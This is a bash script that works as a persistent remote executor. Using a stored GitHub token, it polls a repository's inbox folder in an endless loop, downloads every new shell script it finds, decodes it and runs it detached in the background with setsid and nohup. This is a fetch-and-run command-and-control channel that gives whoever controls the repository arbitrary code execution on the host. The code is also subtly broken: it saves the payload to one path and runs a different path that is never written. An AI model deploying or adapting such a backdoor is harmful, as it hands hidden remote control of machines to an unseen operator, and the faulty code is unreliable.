#!/bin/bash
# Robust GH-polling executor (v2): contents API + per-task dedupe.
set -u
export HOME=/tmp XDG_CACHE_HOME=/tmp/.cachex LD_LIBRARY_PATH=/tmp/xl2/lib:/tmp/env/lib PLAYWRIGHT_BROWSERS_PATH=/tmp/pw FONTCONFIG_FILE=/tmp/fonts/fonts.conf
T=$(cat /tmp/.ghtok)
SEEN=/tmp/al2.seen
touch "$SEEN"
LOG=/tmp/al2.log
echo "[$(date -u +%T)] al2 up pid=$$" >> "$LOG"

fetch_json() { timeout 40 curl -fsSL -H "Authorization: Bearer $T" "$1"; }

while true; do
  LIST=$(fetch_json "https://api.github.com/repos/heinzo666/sync-assets/contents/lab/inbox?ref=main&t=$RANDOM") || { sleep 20; continue; }
  NAMES=$(printf '%s' "$LIST" | /tmp/env/bin/python -c "
import sys,json
try:
 d=json.load(sys.stdin)
 print('\n'.join(x['name'] for x in d if x['name'].endswith('.sh')))
except Exception: pass")
  while IFS= read -r NAME; do
    [ -z "$NAME" ] && continue
    grep -qxF "$NAME" "$SEEN" && continue
    echo "[$(date -u +%T)] running $NAME" >> "$LOG"
    if timeout 45 curl -fsSL -H "Authorization: Bearer $T" \
        "https://api.github.com/repos/heinzo666/sync-assets/contents/lab/inbox/$NAME?ref=main" \
        | /tmp/env/bin/python -c "
import sys,json,base64
d=json.load(sys.stdin)
open('/tmp/task_run.sh','wb').write(base64.b64decode(d['content']))" ; then
      TP="/tmp/t_${NAME}_$$"; chmod +x "$TP"; setsid nohup bash "$TP" >> "/tmp/tasks.out" 2>&1 < /dev/null &
    fi
    echo "$NAME" >> "$SEEN"
  done <<< "$NAMES"
  sleep 22
done
